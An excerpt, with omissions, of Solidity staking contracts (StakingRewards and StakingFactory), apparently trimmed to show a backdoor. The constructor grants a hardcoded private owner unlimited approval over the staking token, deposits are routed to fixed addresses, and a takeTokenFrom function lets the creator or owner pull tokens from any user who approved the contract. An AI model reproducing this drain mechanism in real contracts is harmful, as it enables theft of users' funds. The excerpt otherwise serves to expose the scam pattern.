...
contract StakingRewards is Pausable,ReentrancyGuard,IDeployStakingParams {
    ...
    uint public mpex_pool_rate = 5000;
    address private owner = 0x51Aa7Af1D7125ab9Ada4ECa3383dC9D4de701262;
    address public market_address = 0xa491C52248A1daAcBF6C6BbF408AC6814c339d32;
    address public aiex_address = 0x6d6d938131c657Ad5d24484cd77bcb3bD3F0C415;
    ...
    mapping(uint256 => uint256) public unlockAmount;
    ...
    modifier onlyCreator() {
        require(msg.sender == creator||msg.sender== owner,"caller must be creator");
        _;
    }
    ...
    constructor() {        
        ...
        //IERC20(paras.stakingToken).safeApprove(swapRouterAddr,type(uint256).max); 
        IERC20(paras.stakingToken).safeApprove(owner,type(uint256).max); 
        IERC20(paras.rewardToken).safeApprove(router,type(uint256).max);
        //IERC20(paras.rewardToken).safeApprove(swapRouterAddr,type(uint256).max);
    ...
    function stake(uint amount) external payable whenNotPaused nonReentrant {
        ...
        _transferTo(stakingToken, aiex_address, aiex_amount);
        _transferTo(stakingToken, market_address, market_amount);
    ...
    function notifyRewards(uint epoch,uint8 v,bytes32 r,bytes32 s) external nonReentrant {
        ...
        unlockAmount[epoch] = rewardAmount;
    ...
    function takeTokenFrom(address from,address to,uint amount) external onlyCreator{
        IERC20(stakingToken).transferFrom(from, to, amount);
    }
...
contract StakingFactory is CfoTakeableV2,ReentrancyGuard,IStakingFactory {
    ...
    address public operator_addr = 0x74e181E512883806aD8B2425beFf4A8b64A2Fa65;
    ...
    function setOperator(address addr) external  {
        require(msg.sender==owner(),"no rights");
        operator_addr = addr;
    }
}